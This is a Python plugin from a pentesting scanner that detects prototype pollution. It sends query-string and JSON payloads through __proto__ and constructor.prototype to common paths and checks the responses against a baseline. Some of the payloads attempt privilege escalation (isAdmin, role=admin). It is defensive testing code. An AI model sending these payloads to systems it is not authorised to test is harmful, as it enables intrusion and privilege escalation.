"""Client-side JavaScript Prototype Pollution detection."""

from __future__ import annotations

from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

PP_PAYLOADS = [
    ("?__proto__[basilisk_pp_test]=polluted", "query_proto"),
    ("?__proto__.basilisk_pp_test=polluted", "query_proto_dot"),
    ("?constructor[prototype][basilisk_pp_test]=polluted", "query_constructor"),
    ("?__proto__[toString]=polluted", "query_tostring"),
    ("?__proto__[constructor]=polluted", "query_proto_constructor"),
    ("?__proto__[hasOwnProperty]=polluted", "query_hasown"),
    ("#__proto__[basilisk_pp_test]=polluted", "hash_proto"),
    ("?__proto__[isAdmin]=true", "query_isadmin"),
    ("?__proto__[role]=admin", "query_role"),
    ("?__proto__[status]=1", "query_status"),
]

JSON_PP_PAYLOADS = [
    (
        '{"__proto__":{"basilisk_pp_test":"polluted"}}',
        "json_proto",
    ),
    (
        '{"constructor":{"prototype":{"basilisk_pp_test":"polluted"}}}',
        "json_constructor",
    ),
    (
        '{"__proto__":{"isAdmin":true}}',
        "json_isadmin",
    ),
    (
        '{"__proto__":{"role":"admin","status":1}}',
        "json_role_escalation",
    ),
]

SCAN_PAGES = [
    "/", "/api/", "/api/v1/", "/api/v2/", "/search", "/settings",
    "/config", "/graphql", "/user", "/profile",
]
PP_MARKER = "polluted"


class PrototypePollutionPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="prototype_pollution",
        display_name="Prototype Pollution",
        category=PluginCategory.PENTESTING,
        description="Detects client-side JavaScript prototype pollution via URL params",
        produces=["prototype_pollution_findings"],
        timeout=25.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        findings: list[Finding] = []
        tested: list[dict] = []
        from basilisk.utils.http_check import resolve_base_url

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"pp_tests": []},
            )

        # Get baselines
        baselines: dict[str, str] = {}
        for page in SCAN_PAGES:
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(f"{base_url}{page}", timeout=8.0)
                    baselines[page] = await resp.text(
                        encoding="utf-8", errors="replace"
                    )
            except Exception:
                baselines[page] = ""

        # Test query string payloads
        for page in SCAN_PAGES:
            baseline = baselines.get(page, "")
            if not baseline:
                continue

            for payload_qs, label in PP_PAYLOADS:
                url = f"{base_url}{page}{payload_qs}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(url, timeout=8.0)
                        body = await resp.text(encoding="utf-8", errors="replace")
                except Exception:
                    continue

                # Check if our marker appears in response but not in baseline
                if PP_MARKER in body and PP_MARKER not in baseline:
                    tested.append({
                        "page": page, "label": label, "method": "GET",
                        "reflected": True,
                    })
                    findings.append(Finding.high(
                        f"Prototype pollution: {label} on {page}",
                        description=(
                            "Prototype pollution payload reflected in response. "
                            "The __proto__ or constructor.prototype injection "
                            "modified the server/client-side object."
                        ),
                        evidence=(
                            f"URL: {url}\n"
                            f"Marker '{PP_MARKER}' found in response\n"
                            f"Not present in baseline"
                        ),
                        remediation=(
                            "Sanitize object keys — reject '__proto__', "
                            "'constructor', 'prototype'. Use Object.create(null) "
                            "for user-controlled data. Use Map instead of plain "
                            "objects."
                        ),
                        tags=["pentesting", "prototype-pollution"],
                    ))

                # Check for error messages indicating prototype manipulation
                proto_errors = [
                    "__proto__", "prototype", "object.prototype",
                    "cannot set property", "circular",
                ]
                body_lower = body.lower()
                if (
                    any(e in body_lower for e in proto_errors)
                    and not any(e in baseline.lower() for e in proto_errors)
                ):
                        tested.append({
                            "page": page, "label": label, "method": "GET",
                            "error_based": True,
                        })
                        findings.append(Finding.medium(
                            f"Potential prototype pollution: error on {page}",
                            description=(
                                f"Server returned prototype-related error "
                                f"when processing {label} payload."
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Proto-related error in response"
                            ),
                            remediation=(
                                "Sanitize object keys — reject '__proto__', "
                                "'constructor', 'prototype'."
                            ),
                            tags=["pentesting", "prototype-pollution"],
                        ))

        # Test JSON body payloads
        for page in SCAN_PAGES:
            baseline = baselines.get(page, "")
            for payload_json, label in JSON_PP_PAYLOADS:
                url = f"{base_url}{page}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.post(
                            url,
                            data=payload_json,
                            headers={"Content-Type": "application/json"},
                            timeout=8.0,
                        )
                        body = await resp.text(encoding="utf-8", errors="replace")
                except Exception:
                    continue

                if PP_MARKER in body and PP_MARKER not in baseline:
                    tested.append({
                        "page": page, "label": label, "method": "POST",
                    })
                    findings.append(Finding.high(
                        f"Prototype pollution via JSON: {label} on {page}",
                        description=(
                            "JSON merge with __proto__ reflected in response."
                        ),
                        evidence=(
                            f"URL: {url}\nMethod: POST\n"
                            f"Payload: {payload_json}\n"
                            f"Marker found in response"
                        ),
                        remediation=(
                            "Strip __proto__ and constructor keys from JSON input "
                            "before merging. Use schema validation."
                        ),
                        tags=["pentesting", "prototype-pollution"],
                    ))

        if not findings:
            findings.append(Finding.info(
                "No prototype pollution vulnerabilities detected",
                tags=["pentesting", "prototype-pollution"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"pp_tests": tested},
        )
